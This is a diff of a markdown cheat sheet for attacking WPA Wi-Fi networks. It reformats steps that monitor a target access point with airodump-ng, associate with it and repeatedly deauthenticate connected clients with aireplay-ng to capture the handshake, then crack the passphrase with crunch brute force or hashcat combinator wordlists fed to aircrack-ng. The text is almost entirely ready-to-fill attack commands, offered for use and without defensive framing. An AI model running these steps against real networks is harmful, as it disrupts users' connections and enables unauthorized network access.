@@ -11,12 +11,17 @@ Client:    00:00:00:00:00:ED
 Mon0:      00:00:00:00:00:A8
 Channel:   11
 ```
-2: Screen 1 - Monitor target for clients using: ```airodump-ng -c <Channel> --bssid <BSSID> -w <CaptureName> <Mon0 interface name>```
+2: Screen 1 - Monitor target for clients using: 
+
+```airodump-ng -c <Channel> --bssid <BSSID> -w <CaptureName> <Mon0 interface name>```
   
-3: Screen 2 - Associate with the bssid: ```aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your Mon0 MAC> <Mon0 interface name>```
+3: Screen 2 - Associate with the bssid: 
+
+```aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your Mon0 MAC> <Mon0 interface name>```
   
 4: Screen 3 - death a connected client periodically until the wpa handshake is witnessed / captured in screen 1 
-  ```aireplay-ng -0 1 -a <AP MAC> -c <Client MAC to DeAuth> <Mon0 interface name>```
+  
+```aireplay-ng -0 1 -a <AP MAC> -c <Client MAC to DeAuth> <Mon0 interface name>```
   
 5: Go get a life and hope that you can attack the wifi handshake captured
 
@@ -29,6 +34,7 @@ crunch 8 8 abcdefghijklmnopqrstuvqxyz | aircrack-ng -0 -e "THEAPANAME" -w - /SOM
 ```
 
 7: Failing all the above and if you have a powerful enough GPU GTX 1080 :D then try combinations of words such as:
+
 ```/usr/lib/hashcat-utils/combinator.bin /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt  |aircrack-ng -0 -e "THEAPANAME" -w - SOMEPATH/THECAPTURENAME.cap```
 
 
